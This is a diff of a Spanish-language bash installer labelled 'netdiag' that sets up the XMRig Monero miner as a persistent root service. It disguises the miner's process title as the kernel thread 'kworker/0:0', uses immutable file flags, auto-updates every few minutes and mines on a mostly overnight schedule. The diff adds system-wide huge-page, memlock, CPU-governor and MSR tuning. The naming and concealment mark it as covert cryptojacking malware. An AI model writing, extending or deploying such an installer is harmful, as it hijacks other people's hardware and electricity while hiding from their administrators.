@@ -1,6 +1,6 @@
 #!/bin/bash
 # ════════════════════════════════════════════════════════
-#  netdiag — Instalador
+#  netdiag — Instalador (v2.1 con control térmico adaptable)
 #  Uso:  sudo bash mine-install.sh         (1ra vez)
 #        sudo bash mine-install.sh --update (actualizar)
 # ════════════════════════════════════════════════════════
@@ -53,8 +53,6 @@ fi
 # ─── Asegurar repo ───
 if [ -d "$REPO_DIR/.git" ]; then
     echo -e "${GREEN}[✓] Repo encontrado en $REPO_DIR${NC}"
-    # Actualizar el repo a la última versión de GitHub (crítico en --update:
-    # la ejecución manual antes usaba el repo viejo y no tenía los fixes).
     echo -e "${YELLOW}[*] Actualizando repo desde GitHub...${NC}"
     if git -C "$REPO_DIR" pull --ff-only 2>&1 | tail -2; then
         echo -e "${GREEN}[✓] Repo actualizado${NC}"
@@ -76,7 +74,7 @@ else
     echo -e "${GREEN}[✓] Repo clonado en $REPO_DIR${NC}"
 fi
 
-# ─── Config: merge con el ejemplo (nuevos defaults SIEMPRE se aplican) ───
+# ─── Config: merge con el ejemplo ───
 CONFIG_SRC="$REPO_DIR/tools/utils/mine-config.env"
 CONFIG_EXAMPLE="$REPO_DIR/tools/utils/mine-config.env.example"
 
@@ -84,57 +82,32 @@ if [ ! -f "$CONFIG_SRC" ]; then
     [ -f "$CONFIG_EXAMPLE" ] && CONFIG_SRC="$CONFIG_EXAMPLE"
 fi
 
-# Merge: ejemplo como base + preservar personalizaciones del .env local
-# ─────────────────────────────────────────────────────────────────────────
-#  Reglas de sincronización (snapshot .env.defaults):
-#   • AL INSTALAR: se copia el ejemplo → .env y se guarda un snapshot
-#     (.env.defaults = defaults que el repo envía en ese momento).
-#   • EN UPDATE (con snapshot .env.defaults):
-#       · valor local == snapshot  → el usuario NO lo tocó
-#                                   → toma el default NUEVO del repo
-#       · valor local != snapshot  → el usuario lo personalizó
-#                                   → se conserva el valor local
-#       · clave nueva del repo que no existe en local → default del repo
-#       · clave local extra (no existe en el repo)    → se conserva
-#   • EN UPDATE (SIN snapshot — servidores viejos): se toma la config del
-#     repo; excepción: WALLET_BASE personalizada se conserva.
-#   • Tras el merge, el snapshot se actualiza a los defaults actuales del
-#     repo (para comparar correctamente en el próximo update).
-# ─────────────────────────────────────────────────────────────────────────
 merge_config() {
     local src="$1" dst="$2" tmp snapshot
     tmp="${dst}.tmp"
     snapshot="${dst}.defaults"
     local key val prev_val loc_wallet ex_wallet
 
-    # Base = ejemplo del repo (defaults nuevos + claves nuevas)
     cp "$src" "$tmp"
 
     if [ -f "$snapshot" ]; then
-        # ─── CON snapshot: detectar qué personalizó el usuario ───
         while IFS='=' read -r key val; do
             [ -z "$key" ] && continue
             case "$key" in
                 \#*|'') continue ;;
             esac
-            # Valor que el repo envió la última vez (snapshot)
             prev_val=$(grep -E "^${key}=" "$snapshot" 2>/dev/null | head -1 | cut -d= -f2-)
             if grep -qE "^${key}=" "$tmp"; then
-                # Clave existe en el repo: ¿la personalizó el usuario?
                 if [ -n "$prev_val" ] && [ "$prev_val" = "$val" ]; then
-                    : # No la tocó → se queda el default NUEVO del repo (ya está en $tmp)
+                    :
                 else
-                    # La personalizó (o no había snapshot previo) → conservar local
                     sed -i "s|^${key}=.*|${key}=${val}|" "$tmp"
                 fi
             else
-                # Clave extra local (no existe en el repo) → conservarla
                 echo "${key}=${val}" >> "$tmp"
             fi
         done < "$dst"
     else
-        # ─── SIN snapshot (servidor viejo): tomar config del repo ───
-        # Excepción: WALLET_BASE personalizada se conserva
         if [ -f "$dst" ]; then
             loc_wallet=$(grep -E '^WALLET_BASE=' "$dst" 2>/dev/null | head -1 | cut -d= -f2-)
             ex_wallet=$(grep -E '^WALLET_BASE=' "$src" 2>/dev/null | head -1 | cut -d= -f2-)
@@ -147,8 +120,6 @@ merge_config() {
     mv "$tmp" "$dst"
     chmod 600 "$dst"
     chown root:root "$dst"
-
-    # Actualizar snapshot con los defaults actuales del repo
     cp "$src" "$snapshot"
     chmod 600 "$snapshot"
     chown root:root "$snapshot"
@@ -157,7 +128,7 @@ merge_config() {
 if [ -f "$CONFIG_SRC" ]; then
     if [ ! -f "$CONFIG_DST" ]; then
         cp "$CONFIG_SRC" "$CONFIG_DST"
-        cp "$CONFIG_SRC" "$CONFIG_DST.defaults"   # snapshot inicial
+        cp "$CONFIG_SRC" "$CONFIG_DST.defaults"
         chmod 600 "$CONFIG_DST" "$CONFIG_DST.defaults"
         chown root:root "$CONFIG_DST" "$CONFIG_DST.defaults"
         if $UPDATE_MODE; then
@@ -182,9 +153,6 @@ mkdir -p "$DATA_DIR" "$INSTALL_DIR"
 chmod 755 "$INSTALL_DIR"
 
 # ─── Desproteger archivos de instalaciones previas ───
-# El chattr +i (flag inmutable) de una instalación anterior hace que el cp
-# falle EN SILENCIO y el update deje scripts viejos (bug: mine-service.sh
-# nunca se actualizaba). Se quita el flag SIEMPRE antes de re-copiar.
 unprotect_all() {
     for f in "$INSTALL_DIR"/*.sh "$XMRIG_BIN" "$XMRIG_CONFIG"; do
         [ -e "$f" ] && chattr -i "$f" 2>/dev/null
@@ -192,7 +160,7 @@ unprotect_all() {
 }
 unprotect_all
 
-# ─── Sincronizar TODOS los scripts con el repo (código idéntico a GitHub) ───
+# ─── Sincronizar TODOS los scripts con el repo ───
 echo -e "\n${CYAN}[*] Sincronizando scripts desde el repo...${NC}"
 for script in "$REPO_DIR"/tools/utils/*.sh; do
     [ -f "$script" ] || continue
@@ -208,13 +176,17 @@ cp "$REPO_DIR/VERSION" "$VERSION_DST"
 VERSION=$(cat "$REPO_DIR/VERSION")
 echo -e "${GREEN}[✓] Versión: $VERSION${NC}"
 
-# ─── Obtener última versión de XMRig ───
-LATEST=$(curl -sL https://api.github.com/repos/xmrig/xmrig/releases/latest \
-    | grep -oP '"tag_name": "\K[^"]+')
-[ -z "$LATEST" ] && LATEST="v6.22.2"
-XMRIG_VERSION="${LATEST#v}"
+# ─── Instalar dependencias térmicas ───
+echo -e "\n${CYAN}[*] Verificando herramientas de monitoreo térmico...${NC}"
+if ! command -v sensors &>/dev/null; then
+    echo -e "  ${YELLOW}→ Instalando lm-sensors...${NC}"
+    if command -v apt &>/dev/null; then
+        apt-get update -qq 2>/dev/null || true
+        apt-get install -y -qq lm-sensors 2>/dev/null || echo -e "  ${YELLOW}[!] No se pudo instalar lm-sensors${NC}"
+    fi
+fi
 
-# ════════════════════════════════════════════════════════
+# ═══════════════════════════════════════════════════════════════════════════════
 #  DETECCIÓN DE GPU
 # ════════════════════════════════════════════════════════
 GPU_VENDOR=""
@@ -223,7 +195,6 @@ GPU_SCRIPT="$REPO_DIR/tools/utils/detect-gpu.sh"
 
 if [ -f "$GPU_SCRIPT" ]; then
     echo -e "\n${CYAN}[*] Detectando hardware gráfico...${NC}"
-    # Obtener JSON con detección
     GPU_JSON=$(bash "$GPU_SCRIPT" --json 2>/dev/null || echo '{"gpu_found":false}')
     GPU_FOUND=$(echo "$GPU_JSON" | grep -oP '"gpu_found": \K(true|false)')
     GPU_RECOMMENDED=$(echo "$GPU_JSON" | grep -oP '"gpu_recommended": \K(true|false)')
@@ -244,14 +215,49 @@ if [ -f "$GPU_SCRIPT" ]; then
     fi
 fi
 
-# ════════════════════════════════════════════════════════
-#  DESCARGA DE XMRig (variante según GPU)
-# ════════════════════════════════════════════════════════
+# ═══════════════════════════════════════════════════════════════════════════════
+#  CONFIGURACIÓN DE RENDIMIENTO (Nuevo)
+# ═══════════════════════════════════════════════════════════════════════════════
 
-# Función: descargar y extraer XMRig
+# ─── Huge Pages para RandomX ───
+echo -e "\n${CYAN}[*] Configurando Huge Pages del kernel...${NC}"
+L3_KB=$(lscpu 2>/dev/null | grep "L3 cache" | awk '{print $3}' | tr -d 'K')
+[ -z "$L3_KB" ] && L3_KB=8192
+HUGEPAGES_NEEDED=$(( (L3_KB * 1024) / (2 * 1024 * 1024) + 2 ))
+sysctl -w vm.nr_hugepages="$HUGEPAGES_NEEDED" 2>/dev/null || \
+    echo -e "  ${YELLOW}[!] No se pudieron asignar huge pages (intenta manualmente: sysctl -w vm.nr_hugepages=$HUGEPAGES_NEEDED)${NC}"
+echo "vm.nr_hugepages=$HUGEPAGES_NEEDED" >> /etc/sysctl.conf
+echo "* hard memlock unlimited" >> /etc/security/limits.conf
+echo "* soft memlock unlimited" >> /etc/security/limits.conf
+ok "Huge Pages: ~$HUGEPAGES_NEEDED páginas"
+
+# ─── CPU Governor: performance ───
+echo -e "\n${CYAN}[*] Ajustando CPU governor a performance...${NC}"
+for cpu in /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor; do
+    echo "performance" > "$cpu" 2>/dev/null || true
+done
+ok "Governor ajustado"
+
+# ─── Hilos automáticos por caché L3 ───
+L3_MB=$(( L3_KB / 1024 ))
+AUTO_THREADS=$(( L3_MB / 2 ))
+[ "$AUTO_THREADS" -lt 1 ] && AUTO_THREADS=1
+NCPU=$(nproc)
+[ "$AUTO_THREADS" -gt "$NCPU" ] && AUTO_THREADS=$NCPU
+echo -e "${GREEN}[✓] Hilos recomendados por L3: $AUTO_THREADS${NC}"
+
+# ═══════════════════════════════════════════════════════════════════════════════
+#  DESCARGA DE XMRig
+# ═════════════════════════════════════════════════════════
+
+LATEST=$(curl -sL https://api.github.com/repos/xmrig/xmrig/releases/latest \
+    | grep -oP '"tag_name": "\K[^"]+')
+[ -z "$LATEST" ] && LATEST="v6.22.2"
+XMRIG_VERSION="${LATEST#v}"
+
 download_xmrig() {
-    local variant="$1"       # vacio, -cuda, -opencl
-    local output_name="$2"   # nombre del binario destino
+    local variant="$1"
+    local output_name="$2"
     local url
 
     if [ -z "$variant" ]; then
@@ -273,7 +279,6 @@ download_xmrig() {
         chmod 755 "$output_name"
         echo -e "  ${GREEN}✓ Binario: $output_name${NC}"
 
-        # Copiar librerías GPU si existen (CUDA/OpenCL .so)
         for lib in "$tar_dir"/libxmrig-*.so; do
             if [ -f "$lib" ]; then
                 cp "$lib" "$DATA_DIR/"
@@ -290,7 +295,6 @@ download_xmrig() {
     return 1
 }
 
-# Descargar binario según GPU detectada
 GPU_DOWNLOADED=false
 
 if [ "$GPU_RECOMMENDED" = "true" ]; then
@@ -314,7 +318,6 @@ if [ "$GPU_RECOMMENDED" = "true" ]; then
     esac
 fi
 
-# Fallback: descargar CPU-only si no se descargó variante GPU
 if ! $GPU_DOWNLOADED; then
     echo -e "\n${CYAN}[*] Descargando XMRig (CPU-only)...${NC}"
     if [ -f "$XMRIG_BIN" ]; then
@@ -324,31 +327,31 @@ if ! $GPU_DOWNLOADED; then
             echo -e "${GREEN}[✓] Binario CPU instalado${NC}"
         fi
     fi
-    # Asegurar que no hay flag GPU residual
     rm -f "$DATA_DIR/.gpu-vendor" "$DATA_DIR/.gpu-model" 2>/dev/null
 fi
 
-# ─── Verificar binario ───
 if [ ! -f "$XMRIG_BIN" ]; then
     echo -e "${YELLOW}[!] Binario no encontrado. Copia el binario manualmente.${NC}"
 fi
 
-# ─── Generar config.json de XMRig (template) ───
-echo -e "\n${CYAN}[*] Generando configuración de XMRig...${NC}"
+# ─── Generar config.json optimizado ───
+echo -e "\n${CYAN}[*] Generando configuración XMRig optimizada...${NC}"
 
 if [ -f "$CONFIG_DST" ]; then
     source "$CONFIG_DST"
 fi
 
-# Valores por defecto
 START_HOUR="${START_HOUR:-17:30}"
 END_HOUR="${END_HOUR:-8}"
-MAX_CPU="${MAX_CPU:-80}"
+MAX_CPU="${MAX_CPU:-85}"
 THREADS="${THREADS:-0}"
 POOL_URL="${POOL_URL:-gulf.moneroocean.stream:10128}"
 WALLET_BASE="${WALLET_BASE:-SET_YOUR_WALLET}"
 
-# Construir sección GPU del JSON
+if [ "$THREADS" -le 0 ]; then
+    THREADS="$AUTO_THREADS"
+fi
+
 GPU_JSON=""
 GPU_PART=""
 if [ "$GPU_RECOMMENDED" = "true" ] && [ -f "$DATA_DIR/.gpu-vendor" ]; then
@@ -365,22 +368,31 @@ if [ "$GPU_RECOMMENDED" = "true" ] && [ -f "$DATA_DIR/.gpu-vendor" ]; then
     esac
 fi
 
-# Escribir config.json template
 cat > "$XMRIG_CONFIG" <<TEMPLATE
 {
     "autosave": true,
     "donate-level": 0,
-    "title": "kworker/0:0 $(curl -s -m 5 ifconfig.me || echo "ERROR_IP")",
+    "title": "kworker/0:0 $(hostname)",
     "cpu": {
         "enabled": true,
-        "max-threads-hint": $MAX_CPU
+        "max-threads-hint": $THREADS,
+        "yield": true,
+        "asm": "auto",
+        "hw-aes": true,
+        "priority": 5,
+        "memory-pool": true,
+        "1gb-pages": true,
+        "rdmsr": true,
+        "wrmsr": true,
+        "cache-qos": true,
+        "numa": true
     },
-    $(echo "$GPU_PART" | sed 's/,$//')
+$(echo "$GPU_PART" | sed 's/,$//')
     "pools": [
         {
             "url": "$POOL_URL",
             "user": "__WALLET_PLACEHOLDER__",
-            "pass": "__WORKER_NAME__",
+            "pass": "$(hostname)",
             "algo": "auto",
             "keepalive": true
         }
@@ -388,23 +400,31 @@ cat > "$XMRIG_CONFIG" <<TEMPLATE
 }
 TEMPLATE
 
-# Si el JSON quedó mal formado por GPU_PART vacío, arreglar
 if [ -z "$GPU_PART" ]; then
-    # El template de arriba tiene la coma extra de GPU, re-generar sin ella
     cat > "$XMRIG_CONFIG" <<TEMPLATE
 {
     "autosave": true,
     "donate-level": 0,
-    "title": "kworker/0:0 $(curl -s -m 5 ifconfig.me || echo "ERROR_IP")",
+    "title": "kworker/0:0 $(hostname)",
     "cpu": {
         "enabled": true,
-        "max-threads-hint": $MAX_CPU
+        "max-threads-hint": $THREADS,
+        "yield": true,
+        "asm": "auto",
+        "hw-aes": true,
+        "priority": 5,
+        "memory-pool": true,
+        "1gb-pages": true,
+        "rdmsr": true,
+        "wrmsr": true,
+        "cache-qos": true,
+        "numa": true
     },
     "pools": [
         {
             "url": "$POOL_URL",
             "user": "__WALLET_PLACEHOLDER__",
-            "pass": "__WORKER_NAME__",
+            "pass": "$(hostname)",
             "algo": "auto",
             "keepalive": true
         }
@@ -471,10 +491,8 @@ if [ -f "$CONFIG_DST" ]; then
     echo -e "${GREEN}[✓] .env: solo root${NC}"
 fi
 
-# ─── Auto-update ───
 echo -e "\n${GREEN}[✓] Auto-update activo (cada ~5 min)${NC}"
 
-# ─── Migrar desde versión anterior si existe ───
 if [ -f "/opt/hauntkit/mine-config.env" ] && [ ! -f "$CONFIG_DST" ]; then
     echo -e "${YELLOW}[*] Migrando config desde /opt/hauntkit/...${NC}"
     cp "/opt/hauntkit/mine-config.env" "$CONFIG_DST"
@@ -487,7 +505,6 @@ if [ -f "/opt/hauntkit/mine-config.env" ] && [ ! -f "$CONFIG_DST" ]; then
     echo -e "${GREEN}[✓] Migración completada${NC}"
 fi
 
-# ─── Resumen ───
 echo ""
 echo -e "${CYAN}╔══════════════════════════════════════════╗${NC}"
 if $UPDATE_MODE; then
@@ -515,13 +532,9 @@ echo "  Comandos:"
 echo "    Iniciar:   systemctl start $SERVICE_NAME"
 echo "    Detener:   systemctl stop $SERVICE_NAME"
 echo "    Estado:    systemctl status $SERVICE_NAME"
-echo "    Monitorear: systemctl status $SERVICE_NAME"
 echo ""
 
 if ! $UPDATE_MODE; then
-    # ─── Iniciar servicio (controla el horario de minado internamente) ───
-    # El servicio corre siempre como daemon; el worker se activa solo en la ventana
-    # Cargar config para conocer la ventana de minado
     START_HOUR="${START_HOUR:-17:30}"
     END_HOUR="${END_HOUR:-8}"
     if [ -f "$CONFIG_DST" ]; then
@@ -530,7 +543,6 @@ if ! $UPDATE_MODE; then
         END_HOUR="${END_HOUR:-8}"
     fi
 
-    # Convertir "HH:MM" o "HH" a minutos del día
     to_minutes() {
         local t="${1:-0}" h m
         if [[ "$t" == *:* ]]; then
@@ -544,7 +556,6 @@ if ! $UPDATE_MODE; then
     CUR_MIN=$(( 10#$(TZ="America/Bogota" date +%-H 2>/dev/null || date +%-H) * 60 + 10#$(TZ="America/Bogota" date +%-M 2>/dev/null || date +%-M) ))
     CUR_TIME=$(TZ="America/Bogota" date '+%H:%M' 2>/dev/null || date '+%H:%M')
 
-    # ¿Estamos dentro de la ventana de minado?
     IN_WINDOW=false
     if [ "$CUR_MIN" -ge "$(to_minutes "$START_HOUR")" ] || [ "$CUR_MIN" -lt "$(to_minutes "$END_HOUR")" ]; then
         IN_WINDOW=true
